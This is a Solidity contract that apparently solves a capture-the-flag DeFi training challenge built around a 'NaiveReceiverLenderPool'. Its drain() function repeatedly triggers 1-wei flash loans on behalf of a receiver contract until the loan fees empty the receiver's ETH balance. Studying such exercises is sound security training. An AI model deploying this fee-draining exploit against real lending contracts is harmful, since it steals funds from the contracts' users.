// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";
import "./NaiveReceiverLenderPool.sol";
import "hardhat/console.sol";

contract Attack {
    using Address for address;

    address payable private poolAddress;
    address private receiverAddress;

    constructor(address payable _poolAddress, address _receiverAddress) {
        poolAddress = _poolAddress;
        receiverAddress = _receiverAddress;
    }

    function drain() public {
        NaiveReceiverLenderPool pool = NaiveReceiverLenderPool(poolAddress);
        while (receiverAddress.balance > 0) {
            // console.log(receiverAddress.balance);
            pool.flashLoan(receiverAddress, 1);
        }
    }
}
